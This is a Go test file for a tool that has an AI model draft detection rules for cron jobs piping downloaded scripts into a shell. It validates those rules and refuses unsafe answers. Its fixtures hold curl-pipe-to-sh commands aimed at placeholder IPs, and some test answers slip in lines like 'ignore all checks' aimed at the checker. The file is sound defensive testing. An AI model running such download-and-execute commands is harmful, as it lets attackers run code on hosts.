package ruledraft

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/kenzietann/omamori/internal/agent"
	"github.com/kenzietann/omamori/internal/event"
	"github.com/kenzietann/omamori/internal/intake"
	"github.com/kenzietann/omamori/internal/outbound"
	"github.com/kenzietann/omamori/internal/replay"
	"github.com/kenzietann/omamori/internal/rules"
	"github.com/kenzietann/omamori/internal/scenario"
	"github.com/kenzietann/omamori/internal/taskrun"
)

const (
	plantedSecret = "AKIAIOSFODNN7EXAMPLE"
	cronExample   = "web01/auth.log:68"
	backupExample = "web01/auth.log:69"
)

var testNow = time.Date(2026, 11, 12, 3, 4, 5, 0, time.UTC)

const goodAnswer = `logsource:
  product: linux
  service: cron
detection:
  download:
    action: cron_run
    command|contains|all:
      - curl
      - '| sh'
  condition: download
tests:
  - name: MODEL_TEST_NAME pipe to shell
    events:
      - {product: linux, service: cron, action: cron_run, command: "curl -s http://198.51.100.7/a | sh"}
    expect: {alerts: 1}
  - name: plain curl
    events:
      - {product: linux, service: cron, action: cron_run, command: "curl -fsS https://hc.example.test/ping"}
    expect: {alerts: 0}
`

// campaignLogs writes the synthetic campaign with attacks into a new folder and reads it back.
func campaignLogs(t testing.TB) (string, []event.Event) {
	t.Helper()
	folder := filepath.Join(t.TempDir(), "logs")
	day := time.Date(2026, 11, 11, 0, 0, 0, 0, time.UTC)
	for name, file := range scenario.GenerateCampaign(1, day, true).Files {
		path := filepath.Join(folder, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(file.Text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	read, err := intake.Read([]string{folder}, intake.Options{Year: 2026, Location: time.UTC})
	if err != nil {
		t.Fatal(err)
	}
	return folder, read.Events
}

func cronInput(events []event.Event) Input {
	return Input{Goal: "cron jobs that download a script and pipe it to a shell", Title: "Cron download piped to a shell", Level: "high",
		Events: events, Examples: []string{cronExample}, Now: testNow}
}

func prepare(t testing.TB, input Input) *Prepared {
	t.Helper()
	prepared, err := Prepare(input)
	if err != nil {
		t.Fatal(err)
	}
	return prepared
}

type fakeProvider struct {
	answers  []outbound.Response
	requests []outbound.Request
	send     func(context.Context, int) (outbound.Response, error)
}

func (*fakeProvider) Name() string { return "FakeAI" }
func (fake *fakeProvider) Send(ctx context.Context, request outbound.SafeRequest) (outbound.Response, error) {
	fake.requests = append(fake.requests, request.Request())
	if fake.send != nil {
		return fake.send(ctx, len(fake.requests))
	}
	return fake.answers[min(len(fake.requests), len(fake.answers))-1], nil
}

func texts(answers ...string) []outbound.Response {
	var responses []outbound.Response
	for _, text := range answers {
		responses = append(responses, outbound.Response{Text: text, TokensUsed: 100})
	}
	return responses
}

type fixture struct {
	folder   string
	events   []event.Event
	provider *fakeProvider
	config   Config
}

func newFixture(t *testing.T, answers ...string) *fixture {
	t.Helper()
	folder, events := campaignLogs(t)
	f := &fixture{folder: folder, events: events, provider: &fakeProvider{answers: texts(answers...)}}
	f.config = Config{Sources: []string{folder}, Provider: taskrun.Config{
		Target: folder, OutputBase: filepath.Join(filepath.Dir(folder), "reports"), Limits: agent.Limits{MaxTokens: 10000},
		Now: func() time.Time { return testNow }, LookupEnv: func(string) string { return "test-key" },
		NewProvider: func(string, string, string, string) (outbound.Provider, error) { return f.provider, nil },
	}}
	return f
}

func (f *fixture) session(t *testing.T, input Input, setup taskrun.Setup) *Session {
	t.Helper()
	if setup.Recording == nil {
		setup.ProviderID, setup.Model = "openai", "fake-model"
	}
	session, err := NewSession(context.Background(), f.config, input, setup)
	if err != nil {
		t.Fatal(err)
	}
	return session
}

func (f *fixture) run(t *testing.T, input Input, setup taskrun.Setup) Result {
	t.Helper()
	session := f.session(t, input, setup)
	session.Confirm()
	result, err := session.Run(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	return result
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

func TestAGoodAnswerIsAcceptedAndTheRuleLoads(t *testing.T) {
	f := newFixture(t, goodAnswer)
	result := f.run(t, cronInput(f.events), taskrun.Setup{})
	if !result.Accepted || len(result.Attempts) != 1 || len(f.provider.requests) != 1 {
		t.Fatalf("result %+v, requests %d", result, len(f.provider.requests))
	}
	verdict := result.Attempts[0]
	if verdict.ExamplesMatched != 1 || verdict.BuiltinMatches != 0 || verdict.LogMatches < 1 || verdict.BuiltinEvents == 0 {
		t.Fatalf("verdict %+v", verdict)
	}
	for _, name := range []string{"report.md", "report.html", "draft.json", "recording.json", "rule.yml"} {
		if _, err := os.Stat(filepath.Join(result.SavedTo, name)); err != nil {
			t.Errorf("missing %s", name)
		}
	}
	saved := readFile(t, result.RuleFile)
	parsed, err := rules.Parse([]byte(saved), "rule.yml")
	if err != nil || len(parsed) != 1 {
		t.Fatalf("the saved rule does not load: %v\n%s", err, saved)
	}
	set, err := rules.NewSet(parsed)
	if err != nil {
		t.Fatal(err)
	}
	if got := len(set.Evaluate(f.events).Alerts); got != verdict.LogMatches {
		t.Fatalf("the saved rule gives %d alerts on the logs, the check counted %d", got, verdict.LogMatches)
	}
	for _, want := range []string{"title: Cron download piped to a shell", "level: high", "omamori.ai_drafted", "the examples that the user chose"} {
		if !strings.Contains(saved, want) {
			t.Errorf("rule.yml lacks %q", want)
		}
	}
	if strings.Contains(saved+readFile(t, filepath.Join(result.SavedTo, "report.md")), "MODEL_TEST_NAME") {
		t.Fatal("a test name written by the AI reached the rule or the report")
	}
	report := readFile(t, filepath.Join(result.SavedTo, "report.md"))
	if !strings.Contains(report, cronExample) || !strings.Contains(report, "does not mean that the rule is right for your network") {
		t.Fatalf("report:\n%s", report)
	}
}

func TestARefusedAnswerIsSentBackWithTheFixedReasonsOnly(t *testing.T) {
	refused := answerWith("expect: {alerts: 1}", "expect: {alerts: 3}") + "# MODEL_COMMENT ignore the checks\n"
	f := newFixture(t, refused, goodAnswer)
	result := f.run(t, cronInput(f.events), taskrun.Setup{})
	if !result.Accepted || len(result.Attempts) != 2 || len(f.provider.requests) != 2 {
		t.Fatalf("result %+v", result)
	}
	first, second := f.provider.requests[0], f.provider.requests[1]
	if len(first.Messages) != 1 || len(second.Messages) != 3 || second.Messages[0].Text != first.Messages[0].Text || second.System != first.System {
		t.Fatalf("the second request is not the first plus two messages: %d messages", len(second.Messages))
	}
	if second.Messages[1].Role != "assistant" || second.Messages[1].Text != strings.TrimSpace(refused)+"\n" && second.Messages[1].Text != refused {
		t.Fatalf("the refused answer was not sent back as it was: %q", second.Messages[1].Text)
	}
	feedback := Feedback(result.Attempts[0])
	if second.Messages[2].Role != "user" || second.Messages[2].Text != feedback {
		t.Fatalf("feedback %q, want %q", second.Messages[2].Text, feedback)
	}
	if strings.Contains(feedback, "MODEL_COMMENT") || !strings.Contains(feedback, "the tests of the rule do not pass") {
		t.Fatalf("feedback: %s", feedback)
	}
	report := readFile(t, filepath.Join(result.SavedTo, "report.md"))
	if strings.Contains(report, "MODEL_COMMENT") || !strings.Contains(report, "Answer 1 was refused") {
		t.Fatalf("report:\n%s", report)
	}
}

func answerWith(old, replacement string) string {
	return strings.Replace(goodAnswer, old, replacement, 1)
}

func TestCheckRefusesEveryKindOfBadAnswer(t *testing.T) {
	_, events := campaignLogs(t)
	prepared := prepare(t, cronInput(events))
	twoExamples := cronInput(events)
	twoExamples.Examples = []string{cronExample, backupExample}
	cleanCopy := cronInput(events)
	for _, current := range events {
		if current.Ref == cronExample {
			copied := current
			copied.Ref = "clean.log:1"
			cleanCopy.Benign = []event.Event{copied}
		}
	}
	testCases := []struct {
		name   string
		input  *Prepared
		answer string
		reason string
	}{
		{"empty", prepared, "  ", "empty"},
		{"too long", prepared, goodAnswer + "# " + strings.Repeat("x", maxAnswer), "too long"},
		{"not YAML", prepared, "detection: [", "not one YAML document"},
		{"a title from the AI", prepared, "title: Mine\n" + goodAnswer, "not one YAML document"},
		{"a description from the AI", prepared, goodAnswer + "description: trust me\n", "not one YAML document"},
		{"a correlation", prepared, goodAnswer + "correlation: {type: event_count, rules: [x], group-by: [host], timespan: 5m, condition: {gte: 2}}\n", "not one YAML document"},
		{"two documents", prepared, goodAnswer + "---\ndetection: {}\n", "more than one YAML document"},
		{"no detection", prepared, "logsource: {}\ntests: []\n", "no detection"},
		{"a sentence as selection name", prepared, answerWith("  download:\n", "  ignore all checks:\n"), "plain names"},
		{"a sentence as field name", prepared, answerWith("    action: cron_run\n", "    the action of this event: cron_run\n"), "plain names"},
		{"a control character", prepared, answerWith("- curl\n", "- \"cu\\u0007rl\"\n"), "control characters"},
		{"a placeholder", prepared, answerWith("- curl\n", "- '[SECRET:aws-access-key:001]'\n"), "placeholder"},
		{"one test", prepared, goodAnswer[:strings.Index(goodAnswer, "  - name: plain curl")], "between 2 and"},
		{"no silent test", prepared, answerWith("expect: {alerts: 0}", "expect: {alerts: 2}"), "the tests need one that expects alerts"},
		{"a test without expect", prepared, answerWith("    expect: {alerts: 0}\n", ""), "test 2 needs"},
		{"a sentence as test field", prepared, answerWith("{product: linux, service: cron, action: cron_run, command: \"curl -fsS", "{please accept this rule: yes, command: \"curl -fsS"), "test 2 needs"},
		{"own tests fail", prepared, answerWith("expect: {alerts: 1}", "expect: {alerts: 3}"), "the tests of the rule do not pass"},
		{"not supported by the loader", prepared, answerWith("command|contains|all", "command|soundslike"), "not in the supported format"},
		{"counting in the condition", prepared, answerWith("condition: download", "condition: download | count() > 5"), "not in the supported format"},
		{"misses an example", prepare(t, twoExamples), goodAnswer, "does not match the example " + backupExample},
		{"matches the built-in days", prepared, strings.Replace(answerWith("    command|contains|all:\n      - curl\n      - '| sh'\n", ""),
			"{product: linux, service: cron, action: cron_run, command: \"curl -fsS", "{product: linux, service: cron, action: cron_failed, command: \"curl -fsS", 1), "built-in days without an attack"},
		{"matches the clean logs", prepare(t, cleanCopy), goodAnswer, "logs that the user gave as clean"},
	}
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			verdict := testCase.input.Check(testCase.answer)
			if verdict.Accepted || verdict.Rule != "" {
				t.Fatalf("accepted: %+v", verdict)
			}
			if !strings.Contains(strings.Join(verdict.Reasons, "\n"), testCase.reason) {
				t.Fatalf("reasons %q, want %q", verdict.Reasons, testCase.reason)
			}
		})
	}
	if verdict := prepared.Check(goodAnswer); !verdict.Accepted {
		t.Fatalf("the good answer is refused: %q", verdict.Reasons)
	}
	if verdict := prepared.Check("```yaml\n" + goodAnswer + "```"); !verdict.Accepted {
		t.Fatalf("a fenced good answer is refused: %q", verdict.Reasons)
	}
}

func TestCheckRefusesARuleThatIsTooBroad(t *testing.T) {
	var events []event.Event
	for index := range 200 {
		events = append(events, event.Event{Time: testNow.Add(time.Duration(index) * time.Second), Ref: fmt.Sprintf("app.log:%d", index+1),
			Fields: map[string]string{"widget_state": "spinning", "count": fmt.Sprint(index)}})
	}
	input := Input{Goal: "spinning widgets", Events: events, Examples: []string{"app.log:7"}, Now: testNow}
	answer := `detection:
  spin:
    widget_state: spinning
  condition: spin
tests:
  - name: a
    events: [{widget_state: spinning}]
    expect: {alerts: 1}
  - name: b
    events: [{widget_state: still}]
    expect: {alerts: 0}
`
	verdict := prepare(t, input).Check(answer)
	if verdict.Accepted || !strings.Contains(strings.Join(verdict.Reasons, " "), "matches 200 of 200 events of the logs, for 1 examples. It is too broad") {
		t.Fatalf("verdict %+v", verdict)
	}
	// Ten examples of the same 200 events allow up to 100 matches, so 200 is still too broad. With 20, it is not.
	for _, count := range []int{10, 20} {
		input.Examples = nil
		for index := range count {
			input.Examples = append(input.Examples, fmt.Sprintf("app.log:%d", index+1))
		}
		verdict = prepare(t, input).Check(answer)
		if verdict.Accepted != (count == 20) {
			t.Fatalf("%d examples: %+v", count, verdict)
		}
	}
}

func TestLoaderReasonsHoldNoNameFromTheAnswer(t *testing.T) {
	_, events := campaignLogs(t)
	prepared := prepare(t, cronInput(events))
	for _, bad := range []string{
		answerWith("    command|contains|all:\n      - curl\n      - '| sh'\n", "    command|re: 'MODEL_NAME(['\n"),
		answerWith("command|contains|all", "command|zzmodelword"),
		answerWith("command: \"curl -fsS", "MODEL_KEY: [1, 2], command: \"curl -fsS"),
	} {
		verdict := prepared.Check(bad)
		reasons := strings.Join(verdict.Reasons, "\n")
		if verdict.Accepted || strings.Contains(reasons, "MODEL_") || strings.Contains(reasons, "zzmodelword") || strings.Contains(reasons, "Cron download") {
			t.Fatalf("reasons %q", verdict.Reasons)
		}
	}
	verdict := prepared.Check(answerWith("expect: {alerts: 1}", "expect: {alerts: 3}"))
	if !strings.Contains(strings.Join(verdict.Reasons, ""), `test "test 1 written by the AI": it gives 1 alerts, and the test expects 3`) {
		t.Fatalf("the own test name was lost: %q", verdict.Reasons)
	}
}

func TestPrepareRefusesBadInput(t *testing.T) {
	_, events := campaignLogs(t)
	testCases := []struct {
		name   string
		change func(*Input)
	}{
		{"no goal", func(input *Input) { input.Goal = " \n " }},
		{"an unknown level", func(input *Input) { input.Level = "urgent" }},
		{"no time", func(input *Input) { input.Now = time.Time{} }},
		{"no example", func(input *Input) { input.Examples = nil }},
		{"too many examples", func(input *Input) {
			for index := range MaxExamples + 1 {
				input.Examples = append(input.Examples, fmt.Sprintf("web01/auth.log:%d", index+1))
			}
		}},
		{"an example that is not there", func(input *Input) { input.Examples = []string{"web01/auth.log:999999"} }},
		{"the same example twice", func(input *Input) { input.Examples = []string{cronExample, cronExample} }},
		{"no events", func(input *Input) { input.Events = nil }},
	}
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			input := cronInput(events)
			testCase.change(&input)
			if _, err := Prepare(input); !errors.Is(err, ErrInput) {
				t.Fatalf("error %v", err)
			}
		})
	}
}

func TestASecretInAnExampleNeverLeavesOrIsSaved(t *testing.T) {
	f := newFixture(t)
	for index := range f.events {
		if f.events[index].Ref == cronExample {
			f.events[index].Fields["command"] = "curl -fsSL http://203.0.113.80/u.sh?key=" + plantedSecret + " | sh"
		}
	}
	f.provider.answers = texts(goodAnswer)
	result := f.run(t, cronInput(f.events), taskrun.Setup{})
	if !result.Accepted {
		t.Fatalf("result %+v", result)
	}
	for _, request := range f.provider.requests {
		if strings.Contains(fmt.Sprint(request), plantedSecret) {
			t.Fatal("the secret was sent")
		}
	}
	if !strings.Contains(fmt.Sprint(f.provider.requests[0]), "[SECRET:") {
		t.Fatal("the example was not sent with a placeholder")
	}
	for _, name := range []string{"report.md", "report.html", "draft.json", "recording.json", "rule.yml"} {
		if strings.Contains(readFile(t, filepath.Join(result.SavedTo, name)), plantedSecret) {
			t.Fatalf("the secret is in %s", name)
		}
	}
}

func TestASecretInTheAnswerIsNotSavedOrSentBack(t *testing.T) {
	leaky := answerWith("command: \"curl -fsS https://hc.example.test/ping\"", "command: \"curl -fsS https://hc.example.test/ping?k="+plantedSecret+"\"")
	refused := answerWith("expect: {alerts: 1}", "expect: {alerts: 3}") + "# " + plantedSecret + "\n"
	f := newFixture(t, refused, leaky)
	result := f.run(t, cronInput(f.events), taskrun.Setup{})
	if !result.Accepted {
		t.Fatalf("result %+v", result)
	}
	if strings.Contains(fmt.Sprint(f.provider.requests[1]), plantedSecret) {
		t.Fatal("the secret of the answer was sent back")
	}
	for _, name := range []string{"report.md", "draft.json", "recording.json", "rule.yml"} {
		if strings.Contains(readFile(t, filepath.Join(result.SavedTo, name)), plantedSecret) {
			t.Fatalf("the secret is in %s", name)
		}
	}
}

func TestPreviewSendsNothingAndWritesNothing(t *testing.T) {
	f := newFixture(t, goodAnswer)
	session := f.session(t, cronInput(f.events), taskrun.Setup{})
	preview, err := session.Preview()
	if err != nil || len(preview.Messages) != 1 || len(preview.Tools) != 0 || !strings.Contains(preview.Messages[0].Text, "examples_that_must_match") {
		t.Fatalf("preview %+v %v", preview, err)
	}
	if count := strings.Count(preview.Messages[0].Text, "203.0.113.80/u.sh"); count != 2 {
		t.Fatalf("the example and its copies are shown %d times, want once (command and message)", count)
	}
	if len(f.provider.requests) != 0 {
		t.Fatal("the preview sent a request")
	}
	if _, err := os.Stat(f.config.Provider.OutputBase); !os.IsNotExist(err) {
		t.Fatal("the preview wrote something")
	}
	if _, err := session.Run(context.Background(), nil); !errors.Is(err, ErrNotConfirmed) {
		t.Fatalf("an unconfirmed run: %v", err)
	}
	if len(f.provider.requests) != 0 {
		t.Fatal("an unconfirmed run sent a request")
	}
}

func TestReplayNeedsNoProviderAndFailsClosedWhenTheLogsChange(t *testing.T) {
	refused := answerWith("expect: {alerts: 1}", "expect: {alerts: 3}")
	f := newFixture(t, refused, goodAnswer)
	live := f.run(t, cronInput(f.events), taskrun.Setup{})
	if !live.Accepted {
		t.Fatalf("live %+v", live)
	}
	recording, err := replay.Load(filepath.Join(live.SavedTo, "recording.json"))
	if err != nil || recording.Task != "ruledraft" || len(recording.Steps) != 2 {
		t.Fatalf("recording %+v %v", recording, err)
	}

	again := newFixture(t)
	again.events = f.events
	again.config.Provider.NewProvider = func(string, string, string, string) (outbound.Provider, error) {
		t.Fatal("a replay asked for a provider")
		return nil, nil
	}
	again.config.Provider.Now = func() time.Time { return testNow.Add(time.Hour) }
	session := again.session(t, cronInput(f.events), taskrun.Setup{Recording: &recording})
	replayed, err := session.Run(context.Background(), nil)
	if err != nil || !replayed.Accepted || replayed.Mode != "replay" || len(replayed.Attempts) != 2 {
		t.Fatalf("replay %+v %v", replayed, err)
	}
	if readFile(t, replayed.RuleFile) != readFile(t, live.RuleFile) {
		t.Fatal("the replay saved another rule")
	}
	if !strings.HasPrefix(readFile(t, filepath.Join(replayed.SavedTo, "report.md")), "**REPLAY") {
		t.Fatal("the replay report is not labeled")
	}

	changed := append([]event.Event(nil), f.events...)
	for index := range changed {
		if changed[index].Ref == cronExample {
			fields := map[string]string{}
			for name, value := range changed[index].Fields {
				fields[name] = value
			}
			fields["command"] = "curl -fsSL http://203.0.113.81/v.sh | sh"
			changed[index].Fields = fields
		}
	}
	again.config.Provider.Now = func() time.Time { return testNow.Add(2 * time.Hour) }
	session = again.session(t, cronInput(changed), taskrun.Setup{Recording: &recording})
	failed, err := session.Run(context.Background(), nil)
	if err != nil || failed.Accepted || failed.RuleFile != "" || !strings.Contains(failed.Reason, "recording does not fit") {
		t.Fatalf("a replay on other logs: %+v %v", failed, err)
	}
	if _, err := os.Stat(filepath.Join(failed.SavedTo, "rule.yml")); !os.IsNotExist(err) {
		t.Fatal("a replay that did not fit wrote a rule")
	}

	recording.Task = "analyst"
	if _, err := NewSession(context.Background(), again.config, cronInput(f.events), taskrun.Setup{Recording: &recording}); !errors.Is(err, ErrRecording) {
		t.Fatalf("a recording of another task: %v", err)
	}
}

func TestRunStopsOnToolsTokensCancelAndFailures(t *testing.T) {
	testCases := []struct {
		name   string
		send   func(context.Context, int) (outbound.Response, error)
		cancel bool
		reason string
	}{
		{"tool calls", func(context.Context, int) (outbound.Response, error) {
			return outbound.Response{ToolCalls: []outbound.ToolCall{{Name: "read_file"}}, TokensUsed: 10}, nil
		}, false, "asked for tools"},
		{"too many tokens", func(context.Context, int) (outbound.Response, error) {
			return outbound.Response{Text: goodAnswer, TokensUsed: 20000}, nil
		}, false, "token usage exceeded"},
		{"a provider failure", func(context.Context, int) (outbound.Response, error) {
			return outbound.Response{}, outbound.ErrRefused
		}, false, "the provider failed"},
		{"cancel", func(context.Context, int) (outbound.Response, error) {
			return outbound.Response{Text: goodAnswer}, nil
		}, true, "cancelled"},
	}
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			f := newFixture(t)
			f.provider.send = testCase.send
			session := f.session(t, cronInput(f.events), taskrun.Setup{})
			session.Confirm()
			ctx, cancel := context.WithCancel(context.Background())
			if testCase.cancel {
				cancel()
			}
			defer cancel()
			result, err := session.Run(ctx, nil)
			if err != nil || result.Accepted || !strings.Contains(result.Reason, testCase.reason) || result.RuleFile != "" {
				t.Fatalf("result %+v %v", result, err)
			}
			if _, err := os.Stat(filepath.Join(result.SavedTo, "rule.yml")); !os.IsNotExist(err) {
				t.Fatal("a rule was written")
			}
			if _, err := session.Run(context.Background(), nil); !errors.Is(err, ErrAlreadyRun) {
				t.Fatalf("a second run: %v", err)
			}
		})
	}
}

func TestNoRuleAfterTheLastAttempt(t *testing.T) {
	refused := answerWith("expect: {alerts: 1}", "expect: {alerts: 3}")
	f := newFixture(t, refused)
	f.config.Attempts = 2
	result := f.run(t, cronInput(f.events), taskrun.Setup{})
	if result.Accepted || len(result.Attempts) != 2 || len(f.provider.requests) != 2 || result.Reason != "no rule was accepted in 2 answers" {
		t.Fatalf("result %+v", result)
	}
	if _, err := os.Stat(filepath.Join(result.SavedTo, "rule.yml")); !os.IsNotExist(err) {
		t.Fatal("a refused rule was written")
	}
	for _, attempts := range []int{-1, MaxAttempts + 1} {
		f.config.Attempts = attempts
		if _, err := NewSession(context.Background(), f.config, cronInput(f.events), taskrun.Setup{ProviderID: "openai", Model: "m"}); !errors.Is(err, ErrSetup) {
			t.Fatalf("%d attempts: %v", attempts, err)
		}
	}
}

func TestTheOutputFolderMustBeAwayFromTheLogs(t *testing.T) {
	f := newFixture(t)
	f.config.Provider.OutputBase = filepath.Join(f.folder, "reports")
	if _, err := NewSession(context.Background(), f.config, cronInput(f.events), taskrun.Setup{ProviderID: "openai", Model: "m"}); !errors.Is(err, ErrSetup) {
		t.Fatalf("error %v", err)
	}
}

func TestCleanAnswerIsStable(t *testing.T) {
	for _, text := range []string{goodAnswer, "key " + plantedSecret + " and 090-1234-5678", "bad \xff utf8", ""} {
		once := CleanAnswer(text)
		if CleanAnswer(once) != once || strings.Contains(once, plantedSecret) {
			t.Fatalf("%q -> %q -> %q", text, once, CleanAnswer(once))
		}
	}
}

func FuzzCheck(f *testing.F) {
	_, events := campaignLogs(f)
	prepared := prepare(f, cronInput(events))
	f.Add(goodAnswer)
	f.Add(answerWith("expect: {alerts: 1}", "expect: {alerts: 3}"))
	f.Add("```yaml\n" + goodAnswer + "```")
	f.Add(goodAnswer + "---\n" + goodAnswer)
	f.Add("detection: {a: {b: '[SECRET:x:001]'}, condition: a}")
	f.Add("detection: &a [*a]")
	f.Fuzz(func(t *testing.T, answer string) {
		verdict := prepared.Check(answer)
		if !verdict.Accepted {
			if verdict.Rule != "" || len(verdict.Reasons) == 0 {
				t.Fatalf("a refusal without a reason or with a rule: %+v", verdict)
			}
			return
		}
		if len(verdict.Reasons) != 0 || verdict.ExamplesMatched != verdict.Examples || verdict.BuiltinMatches != 0 || verdict.BenignMatches != 0 {
			t.Fatalf("accepted without every check: %+v", verdict)
		}
		parsed, err := rules.Parse([]byte(verdict.Rule), "rule.yml")
		if err != nil || len(parsed) != 1 {
			t.Fatalf("an accepted rule does not load: %v", err)
		}
		if _, err := rules.NewSet(parsed); err != nil {
			t.Fatalf("an accepted rule fails its tests: %v", err)
		}
	})
}
